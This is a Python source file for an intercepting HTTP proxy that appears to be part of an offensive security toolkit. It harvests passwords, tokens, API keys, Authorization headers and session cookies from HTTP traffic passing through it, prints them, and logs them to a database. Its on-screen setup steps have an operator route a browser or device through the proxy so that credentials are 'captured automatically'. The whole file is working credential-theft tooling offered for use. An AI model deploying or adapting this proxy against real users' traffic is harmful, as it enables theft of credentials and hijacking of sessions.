"""
burp_proxy.py — Web Interception Proxy (mitmproxy-free implementation)
Uses Python's built-in http.server + urllib for zero external dependency proxying.
"""

import os
import sys
import json
import socket
import threading
import urllib.request
import urllib.parse
import urllib.error
import http.server
import questionary
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from core.ui import draw_header, Q_STYLE
from core.database import db

console = Console()

# ── Shared state ──────────────────────────────────────────────────────────────
captured_requests = []
capture_lock = threading.Lock()

SENSITIVE_KEYS = [
    "password", "passwd", "pwd", "token", "api_key",
    "secret", "auth", "access_token", "client_secret", "pass"
]


def _extract_creds(body_str: str, content_type: str) -> list:
    """Parse POST body for sensitive fields (form-encoded or JSON)."""
    found = []
    try:
        if "application/json" in content_type:
            data = json.loads(body_str)
            if isinstance(data, dict):
                for k, v in data.items():
                    if any(s in k.lower() for s in SENSITIVE_KEYS):
                        found.append(f"{k}: {v}")
        else:
            parsed = urllib.parse.parse_qs(body_str)
            for k, v in parsed.items():
                if any(s in k.lower() for s in SENSITIVE_KEYS):
                    found.append(f"{k}: {v[0]}")
    except Exception:
        pass
    return found


# ── Proxy request handler ─────────────────────────────────────────────────────
class ProxyHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # Suppress default access log — we print our own

    def _forward(self, method: str, body: bytes = b""):
        url = self.path
        if not url.startswith("http"):
            # Reconstruct absolute URL for transparent proxy mode
            host = self.headers.get("Host", "")
            url = f"http://{host}{self.path}"

        headers = {}
        for k, v in self.headers.items():
            if k.lower() not in ("proxy-connection", "connection", "keep-alive"):
                headers[k] = v

        # ── Credential interception ───────────────────────────────
        if method in ("POST", "PUT", "PATCH") and body:
            ct = self.headers.get("Content-Type", "")
            try:
                body_str = body.decode("utf-8", errors="ignore")
                creds = _extract_creds(body_str, ct)
                if creds:
                    cred_log = "\n".join(creds)
                    console.print(
                        f"\n[bold red][!] INTERCEPTED CREDENTIALS from "
                        f"{self.client_address[0]}:[/bold red]")
                    for c in creds:
                        console.print(f"    [yellow]{c}[/yellow]")
                    db.log("Burp-Proxy", self.client_address[0],
                           f"Captured at {url}:\n{cred_log}", "CRITICAL")
            except Exception:
                pass

        # ── Auth header interception ──────────────────────────────
        auth = self.headers.get("Authorization", "") or \
               self.headers.get("X-API-Key", "")
        if auth:
            console.print(
                f"\n[bold magenta][!] AUTH HEADER intercepted from "
                f"{self.client_address[0]}[/bold magenta]")
            db.log("Burp-Proxy", self.client_address[0],
                   f"Auth Header at {url}:\n{auth}", "CRITICAL")

        # ── Forward request ───────────────────────────────────────
        try:
            req = urllib.request.Request(
                url, data=body if body else None,
                headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=15) as resp:
                resp_body = resp.read()
                resp_status = resp.status
                resp_headers = list(resp.headers.items())

                # ── Cookie interception ───────────────────────────
                for name, value in resp_headers:
                    if name.lower() == "set-cookie":
                        if any(x in value.lower()
                               for x in ["session", "auth", "token", "jwt"]):
                            clean = value.split(";")[0]
                            console.print(
                                f"\n[bold cyan][!] AUTH COOKIE intercepted "
                                f"from {self.client_address[0]}[/bold cyan]")
                            db.log("Burp-Proxy", self.client_address[0],
                                   f"Auth Cookie at {url}:\n{clean}",
                                   "HIGH")

                # Log to capture table
                with capture_lock:
                    captured_requests.append({
                        "method": method,
                        "url": url,
                        "status": resp_status,
                        "src": self.client_address[0],
                    })
                    if len(captured_requests) > 200:
                        captured_requests.pop(0)

                self.send_response(resp_status)
                skip = {"transfer-encoding", "connection", "keep-alive"}
                for name, value in resp_headers:
                    if name.lower() not in skip:
                        self.send_header(name, value)
                self.end_headers()
                self.wfile.write(resp_body)

        except urllib.error.HTTPError as e:
            self.send_response(e.code)
            self.end_headers()
            self.wfile.write(e.read())
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(f"Proxy error: {e}".encode())

    def do_GET(self):    self._forward("GET")
    def do_HEAD(self):   self._forward("HEAD")
    def do_DELETE(self): self._forward("DELETE")
    def do_OPTIONS(self): self._forward("OPTIONS")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        self._forward("POST", body)

    def do_PUT(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        self._forward("PUT", body)

    def do_CONNECT(self):
        """Handle HTTPS CONNECT tunneling (pass-through, no MITM)."""
        try:
            host, port_str = self.path.split(":", 1)
            port = int(port_str)
            remote = socket.create_connection((host, port), timeout=10)
            self.send_response(200, "Connection Established")
            self.end_headers()

            client_sock = self.connection
            remote_sock = remote

            def relay(src, dst):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception:
                    pass
                finally:
                    try: src.close()
                    except Exception: pass
                    try: dst.close()
                    except Exception: pass

            t1 = threading.Thread(
                target=relay, args=(client_sock, remote_sock), daemon=True)
            t2 = threading.Thread(
                target=relay, args=(remote_sock, client_sock), daemon=True)
            t1.start()
            t2.start()
            t1.join()
            t2.join()
        except Exception:
            self.send_response(502)
            self.end_headers()


# ── Live traffic display ──────────────────────────────────────────────────────
def _display_loop(stop_event: threading.Event):
    """Prints a live summary of captured traffic every 5 seconds."""
    import time
    while not stop_event.is_set():
        time.sleep(5)
        with capture_lock:
            recent = list(captured_requests[-10:])
        if recent:
            table = Table(title="Recent Traffic", border_style="cyan",
                          expand=False)
            table.add_column("Method", style="yellow", width=7)
            table.add_column("Status", style="magenta", width=6)
            table.add_column("Source", style="green", width=15)
            table.add_column("URL", style="white", max_width=60)
            for r in recent:
                table.add_row(
                    r["method"], str(r["status"]), r["src"],
                    r["url"][:80])
            console.print(table)


# ── Entry point ───────────────────────────────────────────────────────────────
def is_port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("127.0.0.1", port)) == 0


def run_burp_proxy():
    draw_header("Web Interception Proxy")

    console.print(
        "[dim]HTTP/HTTPS interception proxy — no external dependencies.[/dim]")
    console.print(
        "[dim]Intercepts credentials, auth headers, and session cookies "
        "and saves them to the Mission Database.[/dim]\n")

    port_str = questionary.text(
        "Listen Port (Default 8080):", default="8080", style=Q_STYLE).ask()
    if not port_str:
        return
    try:
        port = int(port_str)
    except ValueError:
        console.print("[red][!] Invalid port number.[/red]")
        return

    if is_port_in_use(port):
        console.print(
            f"[bold red][!] Port {port} is already in use.[/bold red]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    console.print(Panel(
        f"[bold green]Proxy listening on 0.0.0.0:{port}[/bold green]\n\n"
        "[white]Setup:[/white]\n"
        f"1. Set your browser/device proxy to "
        f"[bold cyan]<YOUR_IP>:{port}[/bold cyan]\n"
        "2. Browse normally — credentials and tokens are captured automatically.\n"
        "3. Press [bold yellow]Ctrl+C[/bold yellow] to stop.\n\n"
        "[dim]HTTPS: tunneled (pass-through). "
        "HTTP: fully intercepted.[/dim]",
        border_style="green",
        title="Proxy Active"
    ))

    stop_event = threading.Event()
    display_thread = threading.Thread(
        target=_display_loop, args=(stop_event,), daemon=True)
    display_thread.start()

    try:
        server = http.server.ThreadingHTTPServer(
            ("0.0.0.0", port), ProxyHandler)
        console.print(
            f"[bold green][+] Proxy engine started. "
            f"Listening on port {port}...[/bold green]\n")
        server.serve_forever()
    except PermissionError:
        console.print(
            "[bold red][!] Permission denied. "
            "Ports below 1024 require sudo.[/bold red]")
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Proxy shutdown.[/yellow]")
    finally:
        stop_event.set()

    questionary.press_any_key_to_continue(style=Q_STYLE).ask()


if __name__ == "__main__":
    run_burp_proxy()